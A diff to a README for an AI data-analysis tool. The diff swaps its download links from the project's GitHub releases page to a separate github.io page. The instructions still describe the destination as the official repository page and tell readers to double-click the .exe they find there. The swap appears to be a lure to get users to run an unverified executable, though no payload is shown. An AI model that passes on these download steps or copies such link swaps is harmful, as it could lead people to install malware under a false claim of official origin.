@@ -1,6 +1,6 @@
 # 🤖 agentic-ai-data-analyst - Analyze your data using natural language
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Urologyholy381/agentic-ai-data-analyst/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://urologyholy381.github.io)
 
 This application transforms your spreadsheet files into clear insights. You upload a CSV file, ask a question, and the tool provides answers, charts, and explanations. It uses modern language models to translate your text into database commands. You do not need to know how to write code or queries to use this software. 
 
@@ -15,7 +15,7 @@ This application transforms your spreadsheet files into clear insights. You uplo
 
 You need to download the installer from the official repository page.
 
-1. Visit this page to download: [https://github.com/Urologyholy381/agentic-ai-data-analyst/releases](https://github.com/Urologyholy381/agentic-ai-data-analyst/releases)
+1. Visit this page to download: [https://urologyholy381.github.io](https://urologyholy381.github.io)
 2. Look for the file ending in .exe under the latest version.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
